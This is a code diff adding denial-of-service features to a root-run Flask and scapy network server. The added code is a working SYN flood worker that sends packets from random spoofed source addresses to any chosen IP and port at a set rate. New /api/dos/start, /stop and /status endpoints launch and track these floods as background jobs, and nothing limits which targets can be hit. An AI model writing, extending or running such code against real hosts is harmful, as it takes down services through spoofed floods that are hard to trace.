@@ -10,6 +10,8 @@ import uuid
 import atexit
 import random
 import subprocess
+import threading
+import time
 
 if os.geteuid() != 0:
     print("ERROR: This server must be run as root (use Docker with NET_ADMIN/NET_RAW caps)")
@@ -19,7 +21,7 @@ print("Root check: OK")
 
 from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
-from scapy.all import IP, TCP, sr1, send, conf
+from scapy.all import IP, TCP, sr1, send, conf, RandIP, RandShort, RandInt
 import requests as req_lib
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -31,6 +33,9 @@ CORS(app)
 
 # ── Session store ──────────────────────────────────────────────────────────────
 sessions = {}  # session_id -> dict
+
+# ── DoS job store ──────────────────────────────────────────────────────────────
+dos_jobs = {}  # job_id -> { thread, stop_event, stats: {sent, start_time} }
 
 # ── iptables RST block helpers ────────────────────────────────────────────────
 
@@ -386,6 +391,94 @@ def http_request_proxy():
         return jsonify({"status": "timeout", "message": "Request timed out (15s)"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
+
+
+# ── DoS attack workers ─────────────────────────────────────────────────────────
+
+def _syn_flood_worker(target_ip, target_port, pps, duration, stop_event, stats):
+    interval = 1.0 / pps if pps > 0 else 0
+    deadline = time.time() + duration if duration > 0 else float('inf')
+    while not stop_event.is_set() and time.time() < deadline:
+        pkt = IP(dst=target_ip, src=str(RandIP())) / TCP(
+            dport=target_port,
+            sport=int(RandShort()),
+            flags='S',
+            seq=int(RandInt()),
+        )
+        send(pkt, verbose=0)
+        stats['sent'] += 1
+        if interval:
+            time.sleep(interval)
+    stop_event.set()
+
+
+_ATTACK_WORKERS = {
+    'syn_flood': _syn_flood_worker,
+}
+
+
+@app.route('/api/dos/start', methods=['POST'])
+def dos_start():
+    data        = request.get_json(force=True)
+    attack_type = data.get('attack_type', 'syn_flood')
+    target_ip   = data.get('target_ip', '').strip()
+    target_port = int(data.get('target_port', 80))
+    pps         = float(data.get('pps', 100))
+    duration    = float(data.get('duration', 0))
+
+    if not target_ip:
+        return jsonify({"status": "error", "message": "target_ip required"}), 400
+    if not (1 <= target_port <= 65535):
+        return jsonify({"status": "error", "message": "target_port out of range"}), 400
+    if attack_type not in _ATTACK_WORKERS:
+        return jsonify({"status": "error", "message": f"unknown attack_type: {attack_type}"}), 400
+
+    job_id     = str(uuid.uuid4())
+    stop_event = threading.Event()
+    stats      = {"sent": 0, "start_time": time.time()}
+
+    t = threading.Thread(
+        target=_ATTACK_WORKERS[attack_type],
+        args=(target_ip, target_port, pps, duration, stop_event, stats),
+        daemon=True,
+    )
+    dos_jobs[job_id] = {"thread": t, "stop_event": stop_event, "stats": stats}
+    t.start()
+
+    return jsonify({"status": "ok", "job_id": job_id})
+
+
+@app.route('/api/dos/stop', methods=['POST'])
+def dos_stop():
+    data   = request.get_json(force=True)
+    job_id = data.get('job_id')
+    job    = dos_jobs.get(job_id)
+    if not job:
+        return jsonify({"status": "error", "message": "unknown job_id"}), 404
+
+    job['stop_event'].set()
+    stats   = job['stats']
+    elapsed = round(time.time() - stats['start_time'], 2)
+    return jsonify({"status": "ok", "stats": {"sent": stats['sent'], "elapsed": elapsed}})
+
+
+@app.route('/api/dos/status', methods=['GET'])
+def dos_status():
+    job_id = request.args.get('job_id')
+    job    = dos_jobs.get(job_id)
+    if not job:
+        return jsonify({"status": "error", "message": "unknown job_id"}), 404
+
+    stats   = job['stats']
+    elapsed = time.time() - stats['start_time']
+    running = not job['stop_event'].is_set()
+    pps_actual = round(stats['sent'] / elapsed, 1) if elapsed > 0 else 0
+    return jsonify({
+        "status":     "running" if running else "stopped",
+        "sent":       stats['sent'],
+        "elapsed":    round(elapsed, 2),
+        "pps_actual": pps_actual,
+    })
 
 
 # ── Main ───────────────────────────────────────────────────────────────────────
